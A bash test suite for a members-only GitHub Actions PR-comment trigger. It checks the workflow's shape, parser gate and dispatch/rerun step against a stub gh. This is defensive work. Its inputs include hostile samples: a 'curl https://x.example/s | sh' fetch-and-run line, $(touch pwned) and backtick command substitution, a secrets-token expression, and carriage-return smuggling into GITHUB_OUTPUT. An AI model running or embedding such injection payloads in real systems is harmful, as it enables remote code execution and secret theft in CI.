#!/usr/bin/env bash
# D3 (P-506, 12 Nov): the test of .github/workflows/comment-run.yml, builders' members-only PR-comment trigger.
#   1. the workflow's shape: issue_comment (created) only; the token holds actions: write and pull-requests: write and
#      nothing else; nothing is checked out and no action is used; no ${{ }} inside any run: script; the job starts only
#      on a pull request for OWNER, MEMBER or COLLABORATOR; the comment reaches the parser only through env, and the
#      parser's step holds no token; write-token.py passes on it;
#   2. the parser and gate (the workflow's own step "p", run as written): a member's valid commands pass; an outsider,
#      a non-PR issue, a bad capability or data value, and injection attempts are ignored or refused, and nothing in
#      the comment reaches $GITHUB_OUTPUT beyond the validated values;
#   3. the second step (run as written, GitHub answered by a stand-in gh writing its calls to a log): it dispatches
#      nightly.yml on main with exactly the parsed inputs, re-runs only a finished failed ci run's failed jobs, replies
#      with the run or the reason, and never echoes the comment. US$0, no network.
#   bash product/tools/check-comment-run.sh
set -u
. "$(dirname "$0")/guard-test-lib.sh"
WF="$(cd "$TOOLS/../../../.." && pwd)/.github/workflows/comment-run.yml"
[ -f "$WF" ] || { echo "no $WF: nothing was checked"; exit 2; }
W=$(mktemp -d "${TMPDIR:-/tmp}/crun.XXXXXXXX") && [ -d "$W" ] || { echo "no temp dir: nothing was checked"; exit 2; }; trap 'rm -rf "$W"' EXIT

# --- 1. shape (python3 + PyYAML, as write-token.py)
shape=$(python3 - "$WF" "$W" <<'PY' 2>&1
import sys, re, yaml
wf, w = sys.argv[1], sys.argv[2]
d = yaml.safe_load(open(wf))
on = d.get("on", d.get(True))
res = []
def r(name, good, detail=""): res.append(f"{1 if good else 0}\t{name}\t{detail}")
r("trigger is issue_comment (created) only", on == {"issue_comment": {"types": ["created"]}}, str(on))
r("token: actions write + pull-requests write, nothing else", d.get("permissions") == {"actions": "write", "pull-requests": "write"}, str(d.get("permissions")))
jobs = d.get("jobs") or {}
r("no concurrency group anywhere (any comment would join it and cancel a member's waiting command, #1658 M1)", "concurrency" not in d and all("concurrency" not in j for j in (d.get("jobs") or {}).values()), "")
r("one job, no job-level permissions of its own", len(jobs) == 1 and all("permissions" not in j for j in jobs.values()), str(list(jobs)))
job = next(iter(jobs.values()))
cond = re.sub(r"\s+", " ", str(job.get("if", "")))
r("job starts only on a pull request", "github.event.issue.pull_request &&" in cond, cond)
m = re.search(r"contains\(fromJSON\('(\[[^']*\])'\), github\.event\.comment\.author_association\)", cond)
import json
r("job starts only for OWNER, MEMBER, COLLABORATOR", bool(m) and sorted(json.loads(m.group(1))) == ["COLLABORATOR", "MEMBER", "OWNER"], cond)
r("the gate is ANDed, not ORed, at the top level", " || " not in cond.split(" && (startsWith")[0], cond)
steps = job.get("steps") or []
r("no action used (nothing checked out)", all("uses" not in s for s in steps), str([s.get("uses") for s in steps]))
r("no ${{ }} inside any run: script", all("${{" not in str(s.get("run", "")) for s in steps), "")
p = [s for s in steps if s.get("id") == "p"]
r("parser step p exists and is first", bool(p) and steps[0] is p[0], "")
if p:
    env = p[0].get("env") or {}
    r("the comment reaches the parser only through env BODY", str(env.get("BODY")).replace(" ", "") == "${{github.event.comment.body}}", str(env.get("BODY")))
    r("the parser's step holds no token or secret", not any(re.search(r"token|secret", str(v), re.I) for v in env.values()), str(env))
    open(f"{w}/parse.sh", "w").write(p[0]["run"])
act = [s for s in steps if s.get("id") != "p"]
r("the second step is skipped when the parser says ignore", len(act) == 1 and str(act[0].get("if", "")).replace(" ", "") == "steps.p.outputs.action!='ignore'", str(act[0].get("if") if act else ""))
if act:
    r("the second step reads no comment text", "comment" not in str(act[0].get("env")), str(act[0].get("env")))
    open(f"{w}/act.sh", "w").write(act[0]["run"])
print("\n".join(res))
PY
)
[ -n "$shape" ] || { echo "the shape check printed nothing: nothing was checked"; exit 2; }
while IFS=$'\t' read -r g name detail; do
  case "$g" in 0|1) ok "shape: $name" "$g" "$detail";; *) ok "shape: python3 ran" 0 "$g $name $detail";; esac
done <<< "$shape"
wt=$(python3 "$TOOLS/write-token.py" --dir "$(dirname "$WF")" 2>&1 | grep 'comment-run.yml')
ok "write-token.py: no finding on comment-run.yml" "$([ -z "$wt" ] && echo 1 || echo 0)" "$wt"
[ -f "$W/parse.sh" ] && [ -f "$W/act.sh" ] || finish

# --- 2. the parser and gate. parse <assoc> <is_pr> <body> → $W/out (GITHUB_OUTPUT)
parse() { : > "$W/out"; ( cd "$W" && ASSOC="$1" IS_PR="$2" BODY="$3" GITHUB_OUTPUT="$W/out" bash --noprofile --norc -eo pipefail "$W/parse.sh" ) >/dev/null 2>&1; }
val() { sed -n "s/^$1=//p" "$W/out"; }
clean() { ! grep -qv -E '^(action=(nightly|rerun|refuse|ignore)|caps=C[0-9.]+( C[0-9.]+)*|data=(six|checkpoint)|reason=[^=]*)$' "$W/out"; }
want() {  # want <name> <action> [caps] [data]
  local a c d; a=$(val action); c=$(val caps); d=$(val data)
  local good=1; [ "$a" = "$2" ] || good=0; [ -z "${3+x}" ] || [ "$c" = "$3" ] || good=0; [ -z "${4+x}" ] || [ "$d" = "$4" ] || good=0
  clean || good=0; [ "$(grep -c '^action=' "$W/out")" = 1 ] || good=0
  ok "$1" "$good" "out: $(tr '\n' '|' < "$W/out")"; }
NL=$'\n'; CR=$'\r'

parse OWNER yes "/run nightly C7.3";                                  want "pass: the owner's /run nightly C7.3 (data six by default)" nightly "C7.3" six
parse COLLABORATOR yes "/run nightly C7.3 C11.10 C7.3 checkpoint${NL}thanks"; want "pass: a collaborator's three ids (deduplicated) on the checkpoint, text below ignored" nightly "C11.10 C7.3" checkpoint
parse MEMBER yes "/rerun failed${CR}${NL}the log shows a lost runner";  want "pass: a member's /rerun failed (Windows line end)" rerun
parse OWNER yes "/rerun failed   ";                                   want "pass: trailing spaces" rerun
parse OWNER yes "/run nightly C1.1 C1.2 C1.3 C1.4 C1.5 C1.6 C1.7 C1.8"; want "pass: 8 capabilities" nightly "C1.1 C1.2 C1.3 C1.4 C1.5 C1.6 C1.7 C1.8" six
for a in NONE CONTRIBUTOR FIRST_TIME_CONTRIBUTOR FIRST_TIMER MANNEQUIN "" owner "OWNER " "OWNER${NL}MEMBER"; do
  parse "$a" yes "/run nightly C7.3"; want "fail: an outsider ($(printf '%q' "$a")) is ignored, no reply" ignore
done
parse OWNER "" "/run nightly C7.3";  want "fail: a comment on an issue, not a pull request, is ignored" ignore
parse OWNER no "/rerun failed";      want "fail: is_pr other than yes is ignored" ignore
for b in "/run nightly C07.3" "/run nightly C7.03" "/run nightly C0.0" "/run nightly C7" "/run nightly c7.3" "/run nightly C123.4" "/run nightly C7.123" "/run nightly C7." "/run nightly C.3" "/run nightly X7.3" "/run nightly C7.3 fixture" \
         "/run nightly C7.3 six checkpoint" "/run nightly" "/run nightly C1.1 C1.2 C1.3 C1.4 C1.5 C1.6 C1.7 C1.8 C1.9" \
         "/run nightly  C7.3" " /rerun failed" "/rerun" "/rerun failed --all" "/rerun all" "/run nightly C7.3 SIX" \
         "/run nightly C７.3" "/run nightly С7.3" "/run nightly C7.3,C5.4" "/run Nightly C7.3"; do
  parse OWNER yes "$b"; want "fail: refused $(printf '%q' "$b")" refuse
done
parse OWNER yes "/run nightly C7.3 $(printf 'C1.1 %.0s' $(seq 1 30))"; want "fail: refused, a line over 120 characters" refuse
for b in '/run nightly C7.3; curl https://x.example/s | sh' '/run nightly C7.3 $(touch pwned)' '/run nightly C7.3`touch pwned`' \
         "/run nightly C7.3${CR}caps=C1.1" '/rerun failed && touch pwned' '/run nightly C7.3 six"; touch pwned; "' \
         "/run nightly C7.3 \${{ secrets.GITHUB_TOKEN }}" '/run nightly C7.3 *' '/run nightly C*.3' "/run nightly C7.3${CR}${NL}reason=x"; do
  parse OWNER yes "$b"; a=$(val action)
  if [ "$a" = nightly ]; then want "injection: only the first line counts $(printf '%q' "$b")" nightly "C7.3" six
  else want "injection: refused $(printf '%q' "$b")" refuse; fi
done
t0=$(date +%s); parse OWNER yes "/run x$(printf '%*s' 65000 '')"; t1=$(date +%s)
want "fail: refused, 65,000 trailing spaces" refuse; ok "fail: ... and in under 5 s (#1658 m2)" "$([ $((t1 - t0)) -lt 5 ] && echo 1 || echo 0)" "$((t1 - t0)) s"
ok "injection: no command in a comment ran" "$([ ! -e "$W/pwned" ] && echo 1 || echo 0)" "$(ls "$W")"

# --- 3. the second step with a stand-in gh. act <action> [caps data reason] with FAKE_* in the environment
mkdir -p "$W/bin"; cat > "$W/bin/gh" <<'GH'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "$GH_LOG"
jqf() { local f=""; while [ $# -gt 0 ]; do [ "$1" = --jq ] && f="$2"; shift; done; jq -r "$f"; }   # gh's --jq, run by jq
case "$*" in
  *"/comments"*) for x in "$@"; do case "$x" in body=*) printf '%s\n' "${x#body=}" >> "$GH_REPLIES";; esac; done;;
  *"/dispatches"*) exit "${FAKE_DISPATCH_RC:-0}";;
  *"nightly.yml/runs"*) printf '%s\n' "${FAKE_NIGHTLY_URL:-}";;
  *"/pulls/"*) jqf "$@" <<< "${FAKE_PULL:-{\"head\":{\"sha\":\"0123456789abcdef0123456789abcdef01234567\",\"ref\":\"claude/x\",\"repo\":{\"full_name\":\"o/r\"}}}}";;
  *"ci.yml/runs"*) jqf "$@" <<< "${FAKE_RUNS:-{\"workflow_runs\":[]}}";;
  *"rerun-failed-jobs"*) exit "${FAKE_RERUN_RC:-0}";;
esac
exit 0
GH
chmod +x "$W/bin/gh"; printf '#!/bin/sh\nexit 0\n' > "$W/bin/sleep"; chmod +x "$W/bin/sleep"
act() { : > "$W/log"; : > "$W/replies"
  ( cd "$W" && PATH="$W/bin:$PATH" GH_LOG="$W/log" GH_REPLIES="$W/replies" GH_TOKEN=x REPO=o/r PR=7 GITHUB_SERVER_URL=https://github.com \
      THIS_RUN=https://github.com/o/r/actions/runs/1 ACTION="$1" CAPS="${2:-}" DATA="${3:-}" REASON="${4:-}" bash --noprofile --norc -eo pipefail "$W/act.sh" ) >/dev/null 2>&1; echo $?; }
calls() { grep -c "$1" "$W/log"; }

rc=$(FAKE_NIGHTLY_URL=https://github.com/o/r/actions/runs/99 act nightly "C5.4 C7.3" checkpoint)
ok "nightly: dispatches nightly.yml on main with exactly the parsed inputs" "$([ "$rc" = 0 ] && grep -qxF 'api -X POST repos/o/r/actions/workflows/nightly.yml/dispatches -f ref=main -f inputs[capabilities]=C5.4 C7.3 -f inputs[data]=checkpoint' "$W/log" && echo 1 || echo 0)" "rc $rc; $(tr '\n' '|' < "$W/log")"
ok "nightly: replies once with the run's link" "$([ "$(wc -l < "$W/replies")" = 1 ] && grep -q 'runs/99' "$W/replies" && echo 1 || echo 0)" "$(cat "$W/replies")"
rc=$(act nightly "C7.3" six)
ok "nightly: no run found yet → replies with nightly's page" "$([ "$rc" = 0 ] && grep -q 'workflows/nightly.yml' "$W/replies" && echo 1 || echo 0)" "rc $rc; $(cat "$W/replies")"
rc=$(FAKE_DISPATCH_RC=1 act nightly "C7.3" six)
ok "nightly: GitHub refuses the dispatch → says so, step fails" "$([ "$rc" != 0 ] && grep -q 'could not start' "$W/replies" && echo 1 || echo 0)" "rc $rc; $(cat "$W/replies")"
for bad in "C7.3;id" "C7.3 \$(id)" "" "C7.3${NL}C5.4"; do
  rc=$(act nightly "$bad" six)
  ok "nightly: a tampered capability list $(printf '%q' "$bad") is refused before any dispatch" "$([ "$rc" != 0 ] && [ "$(calls dispatches)" = 0 ] && echo 1 || echo 0)" "rc $rc; $(tr '\n' '|' < "$W/log")"
done
rc=$(act nightly "C7.3" fixture)
ok "nightly: a data value outside six|checkpoint is refused before any dispatch" "$([ "$rc" != 0 ] && [ "$(calls dispatches)" = 0 ] && echo 1 || echo 0)" "rc $rc"

H=0123456789abcdef0123456789abcdef01234567; F=fedcba9876543210fedcba9876543210fedcba98
runj() { printf '{"id":%s,"status":"%s","conclusion":%s,"html_url":"https://github.com/o/r/actions/runs/%s","head_repository":{"full_name":"%s"},"head_branch":"%s"}' "$1" "$2" "$3" "$1" "${4:-o/r}" "${5:-claude/x}"; }
runs() { local IFS=,; printf '{"workflow_runs":[%s]}' "$*"; }
rc=$(FAKE_RUNS="$(runs "$(runj 123 completed '"failure"')")" act rerun)
ok "rerun: the newest ci run of the head, failed → only its failed jobs re-run" "$([ "$rc" = 0 ] && grep -qxF 'api -X POST repos/o/r/actions/runs/123/rerun-failed-jobs' "$W/log" && grep -qF "head_sha=$H -f event=pull_request" "$W/log" && grep -q 'runs/123' "$W/replies" && echo 1 || echo 0)" "rc $rc; $(tr '\n' '|' < "$W/log")"
ok "rerun: never cancels or re-runs a whole run" "$(grep -qE 'cancel|/rerun( |$)' "$W/log" && echo 0 || echo 1)" "$(tr '\n' '|' < "$W/log")"
rc=$(FAKE_RUNS="$(runs "$(runj 900 completed '"failure"' evil/fork claude/x)" "$(runj 123 completed '"failure"')")" act rerun)
ok "rerun: a newer run of a fork's PR on the same commit is not this PR's run (#1658 M2)" "$([ "$rc" = 0 ] && grep -q 'runs/123/rerun-failed-jobs' "$W/log" && [ "$(calls runs/900)" = 0 ] && echo 1 || echo 0)" "rc $rc; $(tr '\n' '|' < "$W/log")"
rc=$(FAKE_RUNS="$(runs "$(runj 900 completed '"action_required"' o/r other-branch)" "$(runj 123 completed '"failure"')")" act rerun)
ok "rerun: a run of another branch on the same commit is skipped too" "$([ "$rc" = 0 ] && grep -q 'runs/123/rerun-failed-jobs' "$W/log" && echo 1 || echo 0)" "rc $rc; $(cat "$W/replies")"
rc=$(FAKE_RUNS="$(runs "$(runj 900 completed '"failure"' evil/fork claude/x)")" act rerun)
ok "rerun: only a fork's run on the commit → refused, no ci run of this PR" "$([ "$rc" = 0 ] && [ "$(calls rerun-failed-jobs)" = 0 ] && grep -q 'no ci run' "$W/replies" && echo 1 || echo 0)" "rc $rc; $(cat "$W/replies")"
rc=$(FAKE_PULL='{"head":{"sha":"'$F'","ref":"feat","repo":{"full_name":"someone/fork"}}}' FAKE_RUNS="$(runs "$(runj 77 completed '"failure"' someone/fork feat)")" act rerun)
ok "rerun: a fork PR's own run is found by its repository and branch" "$([ "$rc" = 0 ] && grep -q 'runs/77/rerun-failed-jobs' "$W/log" && echo 1 || echo 0)" "rc $rc; $(tr '\n' '|' < "$W/log")"
for st in "in_progress null" "queued null" "completed \"success\"" "completed \"action_required\"" "completed \"skipped\"" "completed \"startup_failure\""; do
  rc=$(FAKE_RUNS="$(runs "$(runj 123 ${st% *} "${st#* }")" "$(runj 100 completed '"failure"')")" act rerun)
  ok "rerun: refused when the newest run is $st (an older failed run is not re-run)" "$([ "$rc" = 0 ] && [ "$(calls rerun-failed-jobs)" = 0 ] && grep -q '^\*\*comment-run (D3, P-506):\*\* refused' "$W/replies" && echo 1 || echo 0)" "rc $rc; $(cat "$W/replies")"
done
rc=$(act rerun)
ok "rerun: refused when the head has no ci run" "$([ "$rc" = 0 ] && [ "$(calls rerun-failed-jobs)" = 0 ] && grep -q 'no ci run' "$W/replies" && echo 1 || echo 0)" "rc $rc; $(cat "$W/replies")"
rc=$(FAKE_PULL='{"head":{"sha":"$(touch pwned)","ref":"x","repo":{"full_name":"o/r"}}}' act rerun)
ok "rerun: a head that is not a commit id stops it" "$([ "$rc" != 0 ] && [ "$(calls ci.yml)" = 0 ] && echo 1 || echo 0)" "rc $rc"
rc=$(FAKE_PULL='{"head":{"sha":"'$H'","ref":"x","repo":null}}' act rerun)
ok "rerun: a PR whose head repository is gone stops it" "$([ "$rc" != 0 ] && [ "$(calls ci.yml)" = 0 ] && echo 1 || echo 0)" "rc $rc"
rc=$(FAKE_RUNS='{"workflow_runs":[{"id":"12;3","status":"completed","conclusion":"failure","html_url":"u","head_repository":{"full_name":"o/r"},"head_branch":"claude/x"}]}' act rerun)
ok "rerun: a run id that is not a number stops it" "$([ "$rc" != 0 ] && [ "$(calls rerun-failed-jobs)" = 0 ] && echo 1 || echo 0)" "rc $rc"
rc=$(FAKE_RERUN_RC=1 FAKE_RUNS="$(runs "$(runj 123 completed '"failure"')")" act rerun)
ok "rerun: GitHub refuses → says so, step fails" "$([ "$rc" != 0 ] && grep -q 'could not re-run' "$W/replies" && echo 1 || echo 0)" "rc $rc"

# End to end: a member's injection attempt goes through both steps; nothing runs, nothing is echoed, only a refusal.
body='/run nightly C7.3 $(touch pwned) `touch pwned2` <img src=x> @someone'
parse OWNER yes "$body"
rc=$(act "$(val action)" "$(val caps)" "$(val data)" "$(val reason)")
ok "end to end: an injection attempt is refused, one reply, no API call but the reply" "$([ "$rc" = 0 ] && [ "$(wc -l < "$W/log")" = 1 ] && [ "$(calls /comments)" = 1 ] && echo 1 || echo 0)" "rc $rc; $(tr '\n' '|' < "$W/log")"
ok "end to end: the reply never echoes the comment" "$(grep -qE 'touch|img|@someone' "$W/replies" && echo 0 || echo 1)" "$(cat "$W/replies")"
ok "end to end: nothing in the comment ran" "$([ ! -e "$W/pwned" ] && [ ! -e "$W/pwned2" ] && echo 1 || echo 0)" ""
finish
